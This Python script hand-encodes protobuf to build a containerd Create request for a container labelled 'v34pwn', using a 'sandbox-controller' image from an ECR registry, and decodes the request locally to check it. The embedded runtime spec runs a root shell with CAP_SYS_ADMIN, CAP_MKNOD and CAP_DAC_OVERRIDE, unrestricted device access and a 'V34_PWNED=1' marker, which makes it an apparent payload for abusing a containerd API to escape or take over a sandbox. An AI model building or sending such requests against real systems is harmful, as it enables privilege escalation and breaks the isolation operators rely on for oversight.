# -*- coding: utf-8 -*-
"""本地验证 V34 Create 请求编码 + 通用 protobuf wire 解析"""
import json

def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)

def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b

def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload

def parse_wire(data):
    out = []
    i, n = 0, len(data)
    while i < n:
        tag = 0; shift = 0
        while True:
            b = data[i]; i += 1
            tag |= (b & 0x7f) << shift; shift += 7
            if not (b & 0x80):
                break
        fno, wt = tag >> 3, tag & 7
        if wt == 0:
            v = 0; shift = 0
            while True:
                b = data[i]; i += 1
                v |= (b & 0x7f) << shift; shift += 7
                if not (b & 0x80):
                    break
            out.append((fno, 'varint', v))
        elif wt == 1:
            out.append((fno, 'i64', data[i:i + 8].hex())); i += 8
        elif wt == 2:
            l = 0; shift = 0
            while True:
                b = data[i]; i += 1
                l |= (b & 0x7f) << shift; shift += 7
                if not (b & 0x80):
                    break
            payload = data[i:i + l]; i += l
            out.append((fno, 'len', payload))
        elif wt == 5:
            out.append((fno, 'i32', data[i:i + 4].hex())); i += 4
        else:
            out.append((fno, 'BADWT%d' % wt, b''))
            break
    return out

def is_msg(val):
    try:
        sub = parse_wire(val)
    except Exception:
        return False
    # 启发式: 所有字段号 < 20 且非 BADWT
    if not sub:
        return False
    return all(t != 'len' or isinstance(v, bytes) for _, t, v in sub) and all(f < 20 for f, t, v in sub)

def dump(msg, name, depth=0):
    ind = '  ' * depth
    for fno, wt, val in msg:
        if wt == 'len' and is_msg(val):
            print('%s%s.%s lenmsg(%d):' % (ind, name, fno, len(val)))
            dump(parse_wire(val), '%s.%s' % (name, fno), depth + 1)
            continue
        if wt == 'len':
            print('%s%s.%s len(%d): %r' % (ind, name, fno, len(val), val[:60].decode('utf-8', errors='replace')))
        else:
            print('%s%s.%s %s: %r' % (ind, name, fno, wt, val))

caps = ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE"]
spec = {"ociVersion": "1.0.2",
        "process": {"user": {"uid": 0, "gid": 0},
                    "args": ["/bin/sh", "-c", "sleep 99999"],
                    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "V34_PWNED=1"],
                    "cwd": "/",
                    "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}},
        "root": {"path": "rootfs"},
        "mounts": [{"destination": "/proc", "type": "proc", "source": "proc"}],
        "linux": {"resources": {"devices": [{"allow": True, "access": "rwm"}]},
                  "cgroupsPath": "/v34pwn-ctr",
                  "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]}}
spec_json = json.dumps(spec).encode()
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
runtime = pstr(1, 'io.containerd.runc.v2')
any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
ctr = pstr(1, 'v34pwn') + pstr(2, IMAGE) + pmsg(3, runtime) + pmsg(4, any_spec)
ctr += pstr(5, 'overlayfs') + pstr(6, '62d59a38-091d-48ee-bc9a-647b33af46ad-snapshot')
req = pmsg(1, ctr)
print('req len:', len(req))
dump(parse_wire(req), 'CreateReq')
print('===== Any payload =====')
dump(parse_wire(any_spec), 'Any')
print('===== spec json head =====')
print(spec_json[:120])
